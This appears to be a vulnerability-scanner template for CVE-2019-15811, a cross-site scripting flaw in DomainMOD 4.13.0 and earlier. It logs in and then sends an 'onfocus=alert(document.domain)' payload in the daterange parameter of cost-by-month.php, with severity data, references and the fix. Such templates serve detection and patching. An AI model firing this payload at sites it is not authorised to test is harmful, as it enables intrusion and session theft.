http:
- host-redirects: true
  matchers:
  - condition: and
    dsl:
    - status_code_2 == 200
    - contains(header_2, "text/html")
    - contains(body_2, "value=\"\"onfocus=\"alert(document.domain)\"autofocus=")
    - contains(body_2, "DomainMOD")
    type: dsl
  max-redirects: 2
  raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    new_username={{username}}&new_password={{password}}

    '
  - 'GET /reporting/domains/cost-by-month.php?daterange=%22onfocus=%22alert(document.domain)%22autofocus=%22
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2019-15811
info:
  author: arafatansari
  classification:
    cpe: cpe:2.3:a:domainmod:domainmod:*:*:*:*:*:*:*:*
    cve-id: CVE-2019-15811
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.78381
    epss-score: 0.01196
  description: 'DomainMOD through 4.13.0 contains a cross-site scripting vulnerability
    via /reporting/domains/cost-by-month.php in Daterange parameters.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to potential data theft, session hijacking, or defacement of the affected website.

    '
  metadata:
    max-request: 2
    product: domainmod
    vendor: domainmod
    verified: true
  name: DomainMOD <=4.13.0 - Cross-Site Scripting
  reference:
  - https://www.exploit-db.com/exploits/47325
  - https://github.com/domainmod/domainmod/issues/108
  - https://nvd.nist.gov/vuln/detail/CVE-2019-15811
  - https://zerodays.lol/
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Upgrade to the latest version of DomainMOD (>=4.13.1) to mitigate
    this vulnerability.

    '
  severity: medium
  tags: cve,cve2019,domainmod,xss,authenticated,edb,vuln
